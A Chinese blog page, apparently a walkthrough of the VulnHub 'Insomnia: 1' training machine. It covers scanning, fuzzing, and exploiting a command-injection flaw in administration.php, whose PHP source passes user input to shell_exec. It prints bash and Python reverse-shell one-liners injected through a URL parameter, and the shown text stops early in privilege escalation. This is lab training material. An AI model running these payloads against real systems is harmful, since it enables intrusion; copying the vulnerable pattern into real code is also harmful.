@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Insomnia: 1">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/04/27/Insomnia%201/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-27T08:52:37.000Z">
+<meta property="article:modified_time" content="2024-04-27T08:57:22.018Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub 靶场">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="Fuzzing">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/04/27/Insomnia%201/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/04/27/Insomnia%201/","path":"2024/04/27/Insomnia 1/","title":"Insomnia: 1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Insomnia: 1 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E9%A1%BE"><span class="nav-text">2.3. 回顾</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">129</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">57</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/04/27/Insomnia%201/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Insomnia: 1 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Insomnia: 1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-04-27 16:52:37 / 修改时间：16:57:22" itemprop="dateCreated datePublished" datetime="2024-04-27T16:52:37+08:00">2024-04-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/insomnia-1,644/">Insomnia: 1 ~
+VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth1  -r  10.0.3.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：10.0.3.13</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 22:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.13</span><br><span class="line">Host is up (0.00089s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)</span><br><span class="line">|_http-title: Chat</span><br><span class="line">MAC Address: 08:00:27:C8:54:A4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.89 ms 10.0.3.13</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 46.23 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>8080 以 guest 进入是个 chat</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271050564.png" /></p>
+<p>但却没法提交信息，源码找到个 chat.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instanse = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> state;</span><br><span class="line"><span class="keyword">var</span> mes;</span><br><span class="line"><span class="keyword">var</span> file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Chat</span> () &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">update</span> = updateChat;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">send</span> = sendChat;</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">getState</span> = getStateOfChat;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getStateOfChat</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!instanse)&#123;</span><br><span class="line">		 instanse = <span class="literal">true</span>;</span><br><span class="line">		 $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">			   <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">			   <span class="attr">url</span>: <span class="string">&quot;process.php&quot;</span>,</span><br><span class="line">			   <span class="attr">data</span>: &#123;  </span><br><span class="line">			   			<span class="string">&#x27;function&#x27;</span>: <span class="string">&#x27;getState&#x27;</span>,</span><br><span class="line">						<span class="string">&#x27;file&#x27;</span>: file</span><br><span class="line">						&#125;,</span><br><span class="line">			   <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">			</span><br><span class="line">			   <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">				   state = data.<span class="property">state</span>;</span><br><span class="line">				   instanse = <span class="literal">false</span>;</span><br><span class="line">			   &#125;,</span><br><span class="line">			&#125;);</span><br><span class="line">	&#125;	 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateChat</span>(<span class="params"></span>)&#123;</span><br><span class="line">	 <span class="keyword">if</span>(!instanse)&#123;</span><br><span class="line">		 instanse = <span class="literal">true</span>;</span><br><span class="line">	     $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">			   <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">			   <span class="attr">url</span>: <span class="string">&quot;process.php&quot;</span>,</span><br><span class="line">			   <span class="attr">data</span>: &#123;  </span><br><span class="line">			   			<span class="string">&#x27;function&#x27;</span>: <span class="string">&#x27;update&#x27;</span>,</span><br><span class="line">						<span class="string">&#x27;state&#x27;</span>: state,</span><br><span class="line">						<span class="string">&#x27;file&#x27;</span>: file</span><br><span class="line">						&#125;,</span><br><span class="line">			   <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">			   <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">				   <span class="keyword">if</span>(data.<span class="property">text</span>)&#123;</span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">text</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                            $(<span class="string">&#x27;#chat-area&#x27;</span>).<span class="title function_">append</span>($(<span class="string">&quot;&lt;p&gt;&quot;</span>+ data.<span class="property">text</span>[i] +<span class="string">&quot;&lt;/p&gt;&quot;</span>));</span><br><span class="line">                        &#125;								  </span><br><span class="line">				   &#125;</span><br><span class="line">				   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;chat-area&#x27;</span>).<span class="property">scrollTop</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;chat-area&#x27;</span>).<span class="property">scrollHeight</span>;</span><br><span class="line">				   instanse = <span class="literal">false</span>;</span><br><span class="line">				   state = data.<span class="property">state</span>;</span><br><span class="line">			   &#125;,</span><br><span class="line">			&#125;);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">else</span> &#123;</span><br><span class="line">		 <span class="built_in">setTimeout</span>(updateChat, <span class="number">1500</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendChat</span>(<span class="params">message, nickname</span>)</span><br><span class="line">&#123;       </span><br><span class="line">    <span class="title function_">updateChat</span>();</span><br><span class="line">     $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">		   <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">		   <span class="attr">url</span>: <span class="string">&quot;process.php&quot;</span>,</span><br><span class="line">		   <span class="attr">data</span>: &#123;  </span><br><span class="line">		   			<span class="string">&#x27;function&#x27;</span>: <span class="string">&#x27;send&#x27;</span>,</span><br><span class="line">					<span class="string">&#x27;message&#x27;</span>: message,</span><br><span class="line">					<span class="string">&#x27;nickname&#x27;</span>: nickname,</span><br><span class="line">					<span class="string">&#x27;file&#x27;</span>: file</span><br><span class="line">				 &#125;,</span><br><span class="line">		   <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">		   <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">			   <span class="title function_">updateChat</span>();</span><br><span class="line">		   &#125;,</span><br><span class="line">		&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接给 process.php POST 数据看看</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271056669.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271056670.png" /></p>
+<p>服务端应该是将受到的 message 写入了 file 中，但尝试写个 shell
+没能成功，process.php 对 file 应该有限制……</p>
+<p>扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.13:8080/&quot;</span> -w /usr/share/wordlists/dirb/common.txt -e php,txt,html  -f</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">…………                                        </span><br><span class="line">[22:21:34] 200 -   65B  - /administration.php                               </span><br><span class="line">…………                                   </span><br><span class="line">[22:21:56] 200 -   44B  - /chat.txt                                         </span><br><span class="line">…………                                      </span><br><span class="line">[22:23:58] 200 -    2B  - /process.php                                      </span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
+<p>查 chat.txt 发现是刚才测试的数据</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271102321.png" /></p>
+<p>访问 administration.php 提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You are not allowed to view :  </span><br><span class="line">Your activity has been logged</span><br></pre></td></tr></table></figure>
+<p>Fuzzing 下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -Z -u http://10.0.3.13:8080/administration.php?FUZZ=FUZ2Z -w /usr/share/wordlists/wfuzz/general/common.txt -w UnixAttacks.fuzzdb.txt --hw 12 </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注，字典</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">GitHub -
+danielmiessler/SecLists: SecLists is the security tester's companion.
+It's a collection of multiple types of lists used during security
+assessments, collected in one place. List types include usernames,
+passwords, URLs, sensitive data patterns, fuzzing payloads, web shells,
+and many more.</a></p>
+</blockquote>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271306724.png" /></p>
+<p>找到个 <code>logfile</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.3.13:8080/administration.php?logfile=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271345463.png" /></p>
+<p>读不了……不过会将提交的参数打印出来，可能存在 RCE
+，不过没测试出来……</p>
+<p>再次扫描目录发现 chat.txt 变大了好多【44KB】，访问得</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271350129.png" /></p>
+<p>logfile 的参数也会写进去，不过没看到更多的其他测试数据，chat.txt
+大小也没再变化，chat.txt 大小有限制？？重置靶机可正常写入了，Fuzzing 下
+RCE</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -Z -u http://10.0.3.14:8080/administration.php?logfile=FUZZ  -w RCE-filter-and-WAF-Bypass.txt</span><br></pre></td></tr></table></figure>
+<p>确实存在 RCE，命令执行结果也会写入 chat.txt</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271431585.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271436946.png" /></p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.159.152/8080 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>未成功，<code>&amp;</code> 处会中断，读取
+<code>cat administration.php</code> 看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$param</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;logfile&#x27;</span>]; </span><br><span class="line">	<span class="keyword">switch</span>(<span class="variable">$param</span>)</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">case</span>(<span class="string">&#x27;chat.txt&#x27;</span>): </span><br><span class="line">			<span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;chat.txt&quot;</span>,<span class="string">&quot;r&quot;</span>); </span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>); </span><br><span class="line">			<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>); </span><br><span class="line">			<span class="keyword">break</span>; </span><br><span class="line">		<span class="keyword">default</span>: </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to view : &#x27;</span>.<span class="variable">$param</span>; </span><br><span class="line">			<span class="variable">$log</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;echo <span class="subst">$param</span> &gt;&gt; chat.txt&quot;</span>); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Your activity has been logged&#x27;</span>; </span><br><span class="line">	&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>&amp;</code> 字符在传输过程中应该被解释为 URL
+参数的分隔符了，因此后面的部分被截断了。换个没 <code>&amp;</code>
+字符的来反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.3.14:8080/administration.php?logfile=`python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.3.5&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>`</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271529922.png" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<p><code>julia</code> 用户下读到一个 flag，<code>sudo -l</code> 得</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(julia) NOPASSWD: /bin/bash /var/www/html/start.sh</span><br></pre></td></tr></table></figure>
